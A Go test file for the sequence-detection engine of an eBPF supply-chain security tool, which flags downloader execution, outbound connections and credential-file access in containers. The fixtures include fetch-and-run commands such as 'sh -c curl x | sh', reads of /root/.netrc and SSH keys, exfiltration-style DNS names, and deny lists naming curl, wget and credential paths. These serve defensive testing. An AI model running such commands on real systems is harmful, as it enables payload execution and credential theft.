package rules

import (
	"fmt"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/model"
)

// 연쇄 규칙(kind: sequence, 11/03) — 엔진. 시계는 이벤트 시각(ev.Timestamp)만 쓴다.

var t0 = time.Date(2026, 11, 3, 9, 0, 0, 0, time.UTC)

var privateCIDRs = []string{"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8", "::1"}

// seqRule: 기본 연쇄 규칙 꼴 — 다운로더 실행 → 내부망 밖 연결 → 자격 증명 파일
func seqRule() Rule {
	return Rule{ID: "chain", Kind: model.KindSequence, Action: model.ActionKill, WindowSeconds: 10, Steps: []Rule{
		{Kind: model.KindExec, DenyComms: []string{"curl", "wget"}},
		{Kind: model.KindConnect, AllowCIDRs: privateCIDRs},
		{Kind: model.KindOpen, DenyPaths: []string{"/root/.netrc", "/root/.ssh/"}},
	}}
}

func at(sec float64) time.Time { return t0.Add(time.Duration(sec * float64(time.Second))) }

func sx(sec float64, comm string) model.Event {
	return model.Event{Kind: model.KindExec, Timestamp: at(sec), ContainerID: "c1", ContainerName: "web-api", Comm: comm, Pid: 5, Args: comm + " http://203.0.113.7/x"}
}

func sc(sec float64, ip string, port uint16) model.Event {
	return model.Event{Kind: model.KindConnect, Timestamp: at(sec), ContainerID: "c1", ContainerName: "web-api", Comm: "wget", Pid: 5, DstIP: ip, DstPort: port, DNSTraced: true}
}

func so(sec float64, p string) model.Event {
	return model.Event{Kind: model.KindOpen, Timestamp: at(sec), ContainerID: "c1", ContainerName: "web-api", Comm: "python", Pid: 7, Path: p}
}

func in(ev model.Event, id, name string) model.Event {
	ev.ContainerID, ev.ContainerName = id, name
	return ev
}

// observeAll: 마지막 이벤트 앞까지는 판정이 없어야 하고, 마지막 이벤트의 판정을 돌려준다
func observeAll(t *testing.T, e *Engine, evs ...model.Event) model.Verdict {
	t.Helper()
	var v model.Verdict
	for i, ev := range evs {
		v = e.Observe(ev)
		if i < len(evs)-1 && v.Sequence != nil {
			t.Fatalf("event %d (%s %s) completed a sequence early: %+v", i, ev.Kind, ev.Detail(), v.Sequence)
		}
	}
	return v
}

func TestSequenceInOrder(t *testing.T) {
	e := New([]Rule{seqRule()})
	v := observeAll(t, e, sx(0, "wget"), sc(1, "203.0.113.7", 80), so(2.4, "/root/.netrc"))
	if !v.Matched || v.RuleID != "chain" || v.Action != model.ActionKill || v.DryRun {
		t.Fatalf("want chain kill, got %+v", v)
	}
	if want := "연쇄 3단계(10초 안): exec wget → connect 203.0.113.7:80 → open /root/.netrc · 2.4초"; v.Reason != want {
		t.Fatalf("reason = %q, want %q", v.Reason, want)
	}
	s := v.Sequence
	if s == nil || s.RuleID != "chain" || s.Action != model.ActionKill || s.DryRun || len(s.Steps) != 3 {
		t.Fatalf("sequence: %+v", s)
	}
	want := []model.SequenceStep{
		{Kind: model.KindExec, Timestamp: at(0), Comm: "wget", Pid: 5, Detail: "wget http://203.0.113.7/x"},
		{Kind: model.KindConnect, Timestamp: at(1), Comm: "wget", Pid: 5, Detail: "203.0.113.7:80"},
		{Kind: model.KindOpen, Timestamp: at(2.4), Comm: "python", Pid: 7, Detail: "/root/.netrc"},
	}
	if !reflect.DeepEqual(s.Steps, want) {
		t.Fatalf("steps:\n got %+v\nwant %+v", s.Steps, want)
	}
	if v.Event.Path != "/root/.netrc" {
		t.Fatalf("verdict event must be the completing event: %+v", v.Event)
	}
}

func TestSequenceOtherEventsBetween(t *testing.T) {
	e := New([]Rule{seqRule()})
	v := observeAll(t, e,
		sx(0, "curl"), so(0.5, "/etc/hosts"), sx(1, "ls"),
		sc(2, "10.0.0.5", 5432), // 내부망 — 단계 아님
		dnsAt(2.5, "example.com"),
		sc(3, "93.184.216.34", 443), so(3.5, "/tmp/x"),
		so(4, "/root/.ssh/id_rsa"))
	if v.RuleID != "chain" || v.Sequence == nil || v.Sequence.Steps[1].Detail != "93.184.216.34:443" {
		t.Fatalf("got %+v", v)
	}
}

func dnsAt(sec float64, name string) model.Event {
	return model.Event{Kind: model.KindDNS, Timestamp: at(sec), ContainerID: "c1", ContainerName: "web-api", Comm: "wget", Pid: 5, DstHost: name, Qtype: "A", DstIP: "127.0.0.11", DstPort: 53}
}

func TestSequenceOutOfOrderNoMatch(t *testing.T) {
	orders := [][]model.Event{
		{sc(0, "203.0.113.7", 80), sx(1, "wget"), so(2, "/root/.netrc")},
		{so(0, "/root/.netrc"), sc(1, "203.0.113.7", 80), sx(2, "wget")},
		{sx(0, "wget"), so(1, "/root/.netrc"), sc(2, "203.0.113.7", 80)},
		{sx(0, "wget"), so(1, "/root/.netrc")}, // 가운데 단계 없음
	}
	for i, evs := range orders {
		e := New([]Rule{seqRule()})
		for _, ev := range evs {
			if v := e.Observe(ev); v.Matched || v.Sequence != nil {
				t.Fatalf("order %d: %s must not match, got %+v", i, ev.Kind, v)
			}
		}
	}
}

func TestSequenceWindowExpired(t *testing.T) {
	e := New([]Rule{seqRule()})
	if v := observeAll(t, e, sx(0, "wget"), sc(5, "203.0.113.7", 80), so(10.1, "/root/.netrc")); v.Matched {
		t.Fatalf("10.1s after the first step is outside a 10s window, got %+v", v)
	}
	e = New([]Rule{seqRule()})
	if v := observeAll(t, e, sx(0, "wget"), sc(5, "203.0.113.7", 80), so(10, "/root/.netrc")); v.RuleID != "chain" {
		t.Fatalf("exactly 10s is inside the window, got %+v", v)
	}
	e = New([]Rule{seqRule()})
	if v := observeAll(t, e, sx(0, "wget"), sc(10.5, "203.0.113.7", 80), so(11, "/root/.netrc")); v.Matched {
		t.Fatalf("second step outside the window must not extend, got %+v", v)
	}
}

// i 단계까지 마친 연쇄는 가장 늦게 시작한 것 하나만 남긴다 — 그래야 창 안에 들 가능성이 가장 크다
func TestSequenceLatestStartWins(t *testing.T) {
	e := New([]Rule{seqRule()})
	v := observeAll(t, e, sx(0, "wget"), sx(8, "curl"), sc(9, "203.0.113.7", 80), so(15, "/root/.netrc"))
	if v.RuleID != "chain" || !v.Sequence.Steps[0].Timestamp.Equal(at(8)) || v.Sequence.Steps[0].Comm != "curl" || !strings.HasSuffix(v.Reason, " · 7.0초") {
		t.Fatalf("got %+v", v)
	}
	// 둘째 단계까지 마친 연쇄도 늦은 시작으로 바뀐다
	e = New([]Rule{seqRule()})
	v = observeAll(t, e, sx(0, "wget"), sc(1, "203.0.113.7", 80), sx(5, "curl"), sc(6, "198.51.100.9", 443), so(12, "/root/.netrc"))
	if v.RuleID != "chain" || !v.Sequence.Steps[0].Timestamp.Equal(at(5)) || v.Sequence.Steps[1].Detail != "198.51.100.9:443" {
		t.Fatalf("got %+v", v)
	}
}

// 완성 뒤 그 컨테이너 · 규칙의 상태는 비운다 — 같은 창 안에서 다시 걸리려면 처음부터 다시 이어져야 한다
func TestSequenceResetAfterFire(t *testing.T) {
	e := New([]Rule{seqRule()})
	if v := observeAll(t, e, sx(0, "wget"), sc(1, "203.0.113.7", 80), so(2, "/root/.netrc")); v.RuleID != "chain" {
		t.Fatalf("first fire: %+v", v)
	}
	for _, ev := range []model.Event{so(3, "/root/.netrc"), sc(3.5, "203.0.113.7", 80), so(3.6, "/root/.netrc")} {
		if v := e.Observe(ev); v.Sequence != nil {
			t.Fatalf("must not re-fire without a new first step: %+v", v)
		}
	}
	if v := observeAll(t, e, sx(4, "wget"), sc(5, "203.0.113.7", 80), so(6, "/root/.netrc")); v.RuleID != "chain" {
		t.Fatalf("second fire: %+v", v)
	}
}

// 한 이벤트는 같은 연쇄의 단계 하나만 채운다(단계를 뒤에서부터 본다)
func TestSequenceOneEventOneStep(t *testing.T) {
	r := Rule{ID: "twice", Kind: model.KindSequence, Action: model.ActionAlert, WindowSeconds: 5, Steps: []Rule{
		{Kind: model.KindOpen, DenyPaths: []string{"/root/"}},
		{Kind: model.KindOpen, DenyPaths: []string{"/root/.netrc"}},
	}}
	e := New([]Rule{r})
	if v := e.Observe(so(0, "/root/.netrc")); v.Sequence != nil {
		t.Fatalf("one event must not fill two steps: %+v", v)
	}
	if v := e.Observe(so(1, "/root/.netrc")); v.Sequence == nil || v.RuleID != "twice" || v.Action != model.ActionAlert {
		t.Fatalf("second event completes: %+v", v)
	}
}

func TestSequenceOtherContainerNoMatch(t *testing.T) {
	e := New([]Rule{seqRule()})
	if v := observeAll(t, e, sx(0, "wget"), in(sc(1, "203.0.113.7", 80), "c2", "worker"), so(2, "/root/.netrc")); v.Matched {
		t.Fatalf("steps in another container must not chain, got %+v", v)
	}
	if v := observeAll(t, e, in(so(2.5, "/root/.netrc"), "c2", "worker"), sc(3, "203.0.113.7", 80), so(4, "/root/.netrc")); v.RuleID != "chain" {
		t.Fatalf("c1 chain still alive: %+v", v)
	}
}

func TestSequenceContainersScope(t *testing.T) {
	r := seqRule()
	r.Containers = []string{"sg-install-*", "evil/*"}
	e := New([]Rule{r})
	if v := observeAll(t, e, sx(0, "wget"), sc(1, "203.0.113.7", 80), so(2, "/root/.netrc")); v.Matched {
		t.Fatalf("outside scope: %+v", v)
	}
	evs := []model.Event{sx(3, "wget"), sc(4, "203.0.113.7", 80), so(5, "/root/.netrc")}
	for i := range evs {
		evs[i] = in(evs[i], "c9", "sg-install-pip-1")
	}
	if v := observeAll(t, e, evs...); v.RuleID != "chain" {
		t.Fatalf("inside scope by name: %+v", v)
	}
	for i := range evs {
		evs[i] = in(evs[i], "c8", "app")
		evs[i].ImageName = "evil/pkg:1"
	}
	if v := observeAll(t, e, evs...); v.RuleID != "chain" {
		t.Fatalf("inside scope by image: %+v", v)
	}
}

func TestSequenceDryRunAndDisabled(t *testing.T) {
	r := seqRule()
	r.DryRun = true
	v := observeAll(t, New([]Rule{r}), sx(0, "wget"), sc(1, "203.0.113.7", 80), so(2, "/root/.netrc"))
	if v.RuleID != "chain" || v.Action != model.ActionKill || !v.DryRun || !v.Sequence.DryRun {
		t.Fatalf("dry-run: %+v", v)
	}
	r = seqRule()
	r.Action = model.ActionAlert
	r.DryRun = true // alert 에는 dryRun 이 붙지 않는다(단일 규칙과 같음)
	v = observeAll(t, New([]Rule{r}), sx(0, "wget"), sc(1, "203.0.113.7", 80), so(2, "/root/.netrc"))
	if v.RuleID != "chain" || v.Action != model.ActionAlert || v.DryRun || v.Sequence.DryRun {
		t.Fatalf("alert: %+v", v)
	}
	r = seqRule()
	r.Disabled = true
	e := New([]Rule{r})
	if v := observeAll(t, e, sx(0, "wget"), sc(1, "203.0.113.7", 80), so(2, "/root/.netrc")); v.Matched || v.Sequence != nil {
		t.Fatalf("disabled: %+v", v)
	}
	if n := e.seqTracked(); n != 0 {
		t.Fatalf("disabled rule must not keep state, tracked=%d", n)
	}
}

// 겹침: 판정 1건. 더 강한 쪽이 이기고 동률이면 단일 규칙 — 진 연쇄는 Sequence 에 주석으로 남는다
func TestSequenceMergeSingleWins(t *testing.T) {
	single := Rule{ID: "netrc", Kind: model.KindOpen, Action: model.ActionKill, DenyPaths: []string{"/root/.netrc"}}
	chain := []model.Event{sx(0, "wget"), sc(1, "203.0.113.7", 80), so(2, "/root/.netrc")}
	// 동률(kill = kill)
	v := observeAll(t, New([]Rule{seqRule(), single}), chain...)
	if v.RuleID != "netrc" || v.Action != model.ActionKill || v.Reason != "민감 파일 접근: /root/.netrc" || v.Sequence == nil || v.Sequence.RuleID != "chain" {
		t.Fatalf("tie → single rule, sequence annotated: %+v", v)
	}
	// 단일이 더 강함(kill > kill dry-run)
	dry := seqRule()
	dry.DryRun = true
	v = observeAll(t, New([]Rule{dry, single}), chain...)
	if v.RuleID != "netrc" || v.DryRun || v.Sequence == nil || !v.Sequence.DryRun {
		t.Fatalf("stronger single rule: %+v", v)
	}
}

func TestSequenceMergeSequenceWins(t *testing.T) {
	chain := []model.Event{sx(0, "wget"), sc(1, "203.0.113.7", 80), so(2, "/root/.netrc")}
	alert := Rule{ID: "netrc", Kind: model.KindOpen, Action: model.ActionAlert, DenyPaths: []string{"/root/.netrc"}}
	v := observeAll(t, New([]Rule{alert, seqRule()}), chain...)
	if v.RuleID != "chain" || v.Action != model.ActionKill || v.DryRun || !strings.HasPrefix(v.Reason, "연쇄 3단계(10초 안): ") || v.Sequence == nil {
		t.Fatalf("kill sequence beats alert: %+v", v)
	}
	dry := Rule{ID: "netrc", Kind: model.KindOpen, Action: model.ActionKill, DryRun: true, DenyPaths: []string{"/root/.netrc"}}
	if v := observeAll(t, New([]Rule{dry, seqRule()}), chain...); v.RuleID != "chain" || v.DryRun {
		t.Fatalf("kill sequence beats kill dry-run: %+v", v)
	}
	// 같은 이벤트로 연쇄 둘이 완성: 더 강한 것, 동률이면 정책 순서(앞)
	weak := seqRule()
	weak.ID, weak.Action = "chain-alert", model.ActionAlert
	other := seqRule()
	other.ID = "chain-2"
	if v := observeAll(t, New([]Rule{weak, seqRule(), other}), chain...); v.RuleID != "chain" || v.Sequence.RuleID != "chain" {
		t.Fatalf("strongest, then first in policy order: %+v", v)
	}
}

func TestSequenceStateBounded(t *testing.T) {
	e := New([]Rule{seqRule()})
	for i := range seqMaxContainers + 10 {
		ev := in(sx(0, "wget"), fmt.Sprintf("c%04d", i), "web")
		ev.Timestamp = t0.Add(time.Duration(i) * time.Millisecond)
		e.Observe(ev)
	}
	if n := e.seqTracked(); n != seqMaxContainers {
		t.Fatalf("tracked = %d, want cap %d", n, seqMaxContainers)
	}
	// 가장 오래된 컨테이너(c0000)부터 밀려났다
	if v := observeAll(t, e, in(sc(2, "203.0.113.7", 80), "c0000", "web"), in(so(3, "/root/.netrc"), "c0000", "web")); v.Sequence != nil {
		t.Fatalf("evicted container must start over: %+v", v)
	}
	last := fmt.Sprintf("c%04d", seqMaxContainers+9)
	if v := observeAll(t, e, in(sc(2, "203.0.113.7", 80), last, "web"), in(so(3, "/root/.netrc"), last, "web")); v.RuleID != "chain" {
		t.Fatalf("newest container keeps its chain: %+v", v)
	}
	// 만료 정리: 60초 넘게 조용한 컨테이너는 다음 정리 때 지운다(이벤트 시각 기준)
	e.Observe(in(sx(200, "ls"), "c-late", "web"))
	if n := e.seqTracked(); n != 0 {
		t.Fatalf("stale containers must be swept, tracked=%d", n)
	}
	// 단계 상세는 160자로 자른다
	long := sx(300, "wget")
	long.Args = "wget " + strings.Repeat("가", 400)
	v := observeAll(t, e, long, sc(301, "203.0.113.7", 80), so(302, "/root/.netrc"))
	if d := v.Sequence.Steps[0].Detail; len([]rune(d)) > seqDetailMax || !strings.HasPrefix(d, "wget 가가") {
		t.Fatalf("detail not truncated: %d runes", len([]rune(d)))
	}
}

func TestSequenceForget(t *testing.T) {
	e := New([]Rule{seqRule()})
	observeAll(t, e, sx(0, "wget"), sc(1, "203.0.113.7", 80))
	e.Forget("c1")
	if v := e.Observe(so(2, "/root/.netrc")); v.Sequence != nil {
		t.Fatalf("forgotten container must start over: %+v", v)
	}
	if n := e.seqTracked(); n != 0 {
		t.Fatalf("tracked = %d", n)
	}
}

func TestSequenceReplaceResets(t *testing.T) {
	e := New([]Rule{seqRule()})
	observeAll(t, e, sx(0, "wget"), sc(1, "203.0.113.7", 80))
	e.Replace([]Rule{seqRule()})
	if v := e.Observe(so(2, "/root/.netrc")); v.Sequence != nil {
		t.Fatalf("policy reload must reset sequence state: %+v", v)
	}
}

func TestSequenceDNSStep(t *testing.T) {
	r := Rule{ID: "dns-then-out", Kind: model.KindSequence, Action: model.ActionAlert, WindowSeconds: 5, Steps: []Rule{
		{Kind: model.KindDNS, DenyHosts: []string{"attacker.test"}},
		{Kind: model.KindConnect, AllowCIDRs: privateCIDRs},
	}}
	e := New([]Rule{r})
	v := observeAll(t, e, dnsAt(0, "c2.attacker.test"), sc(1.5, "203.0.113.7", 443))
	if v.RuleID != "dns-then-out" || v.Reason != "연쇄 2단계(5초 안): dns c2.attacker.test (A) → connect 203.0.113.7:443 · 1.5초" {
		t.Fatalf("got %+v", v)
	}
}

// 단계의 directIp 는 「걸림 / 안 걸림」만 정한다. allow 면 직접 IP 연결은 단계가 아니고, alert · kill 이어도 판정 행동은 연쇄 규칙의 action 이다
func TestSequenceConnectDirectIPAllowNotStep(t *testing.T) {
	mk := func(d string) Rule {
		return Rule{ID: "dl-direct", Kind: model.KindSequence, Action: model.ActionAlert, WindowSeconds: 10, Steps: []Rule{
			{Kind: model.KindExec, DenyComms: []string{"wget"}},
			{Kind: model.KindConnect, DirectIP: d},
		}}
	}
	if v := observeAll(t, New([]Rule{mk("allow")}), sx(0, "wget"), sc(1, "203.0.113.7", 80)); v.Matched || v.Sequence != nil {
		t.Fatalf("directIp allow is not a step: %+v", v)
	}
	v := observeAll(t, New([]Rule{mk("kill")}), sx(0, "wget"), sc(1, "203.0.113.7", 80))
	if v.RuleID != "dl-direct" || v.Action != model.ActionAlert || v.DryRun {
		t.Fatalf("directIp kill step → sequence action alert: %+v", v)
	}
}

// 회귀: 연쇄가 완성되지 않는 한 Observe 는 Evaluate 와 같은 판정을 낸다(연쇄 규칙이 있는 정책 · 없는 정책 양쪽)
func TestObserveEqualsEvaluateWithoutSequence(t *testing.T) {
	long := strings.Repeat("deadbeef", 6) + ".exfil.example"
	pub := model.Event{Kind: model.KindConnect, ContainerID: "c1", DstIP: "203.0.113.7", DstPort: 443, DNSTraced: true}
	withHost := func(ev model.Event, h string) model.Event { ev.DstHost = h; return ev }
	withIP := func(ev model.Event, ip string) model.Event { ev.DstIP = ip; return ev }
	sandbox := func(ev model.Event) model.Event { ev.ContainerName = "sg-install-pip-1"; return ev }
	noDNS := pub
	noDNS.DNSTraced = false
	events := []model.Event{
		// TestEvaluate
		{Kind: model.KindOpen, Path: "/etc/shadow"},
		{Kind: model.KindOpen, Path: "/home/app/.ssh/id_rsa"},
		{Kind: model.KindOpen, Path: "/etc/hosts"},
		{Kind: model.KindExec, Comm: "curl", Args: "curl -s http://x"},
		{Kind: model.KindExec, Comm: "busybox", Args: "/usr/bin/wget -q x"},
		{Kind: model.KindExec, Comm: "sh", Args: "sh -c curl x | sh"},
		{Kind: model.KindExec, Comm: "cat", Args: "cat /dev/null"},
		{Kind: model.KindConnect, DstIP: "93.184.216.34", DstPort: 443},
		{Kind: model.KindConnect, DstIP: "203.0.113.10", DstPort: 8081},
		{Kind: model.KindConnect, DstIP: "203.0.113.10", DstPort: 4444},
		{Kind: model.KindConnect, DstIP: "172.18.0.4", DstPort: 5432},
		// TestDNSRules · TestDefaultPolicyDNS
		dnsEv("c2.attacker.test", "A"), dnsEv("other.example", "TXT"), dnsEv("pypi.org", "A"), dnsEv(long, "A"),
		dnsEv("files.pythonhosted.org", "A"), dnsEv("localhost", "A"), dnsEv("11.0.0.127.in-addr.arpa", "PTR"),
		dnsEv("data.exfil.example", "TXT"), sandbox(dnsEv("evil.test", "A")), sandbox(dnsEv(long, "A")),
		// TestDirectIP · TestDefaultPolicyDirectIP
		pub, sandbox(pub), withHost(pub, "evil.test"), withHost(pub, "files.pypi.org"), withHost(pub, "api.github.com"),
		withIP(pub, "10.1.2.3"), withIP(pub, "192.168.0.9"), withIP(pub, "::1"), noDNS,
	}
	def, err := LoadFile("../../policies/default.yaml")
	if err != nil {
		t.Fatal(err)
	}
	var withSeq []Rule
	for _, r := range def {
		if r.Kind != model.KindSequence {
			withSeq = append(withSeq, r)
		}
	}
	plain := append([]Rule(nil), withSeq...)
	withSeq = append(withSeq, seqRule())
	for name, rs := range map[string][]Rule{"with sequence": withSeq, "without sequence": plain} {
		obs, ev := New(rs), New(rs)
		for i, x := range events {
			got, want := obs.Observe(x), ev.Evaluate(x)
			if !reflect.DeepEqual(got, want) {
				t.Fatalf("%s: event %d (%s %s): Observe %+v != Evaluate %+v", name, i, x.Kind, x.Detail(), got, want)
			}
		}
	}
}

// Evaluate 는 상태 없는 평가 그대로 — 연쇄 규칙을 건너뛰고 연쇄 상태도 건드리지 않는다(미리보기 · 제안 · 건 예외가 쓴다)
func TestEvaluateIgnoresSequenceRules(t *testing.T) {
	e := New([]Rule{seqRule()})
	for _, ev := range []model.Event{sx(0, "wget"), sc(1, "203.0.113.7", 80), so(2, "/root/.netrc")} {
		if v := e.Evaluate(ev); v.Matched || v.Sequence != nil {
			t.Fatalf("Evaluate must not match sequence rules: %+v", v)
		}
	}
	if n := e.seqTracked(); n != 0 {
		t.Fatalf("Evaluate must not touch sequence state, tracked=%d", n)
	}
	if v := e.Observe(so(3, "/root/.netrc")); v.Sequence != nil {
		t.Fatalf("Evaluate calls must not have advanced the chain: %+v", v)
	}
}

// 동시성: Observe · Evaluate · Replace · Forget 를 함께 불러도 경쟁이 없다(-race)
func TestSequenceConcurrent(t *testing.T) {
	e := New([]Rule{seqRule()})
	var wg sync.WaitGroup
	for g := range 4 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			id := fmt.Sprintf("c%d", g)
			for i := range 200 {
				s := float64(i)
				e.Observe(in(sx(s, "wget"), id, "web"))
				e.Observe(in(sc(s+0.1, "203.0.113.7", 80), id, "web"))
				e.Evaluate(in(so(s+0.2, "/root/.netrc"), id, "web"))
				e.Observe(in(so(s+0.2, "/root/.netrc"), id, "web"))
				if i%50 == 0 {
					e.Forget(id)
					e.Replace([]Rule{seqRule()})
				}
			}
		}()
	}
	wg.Wait()
}
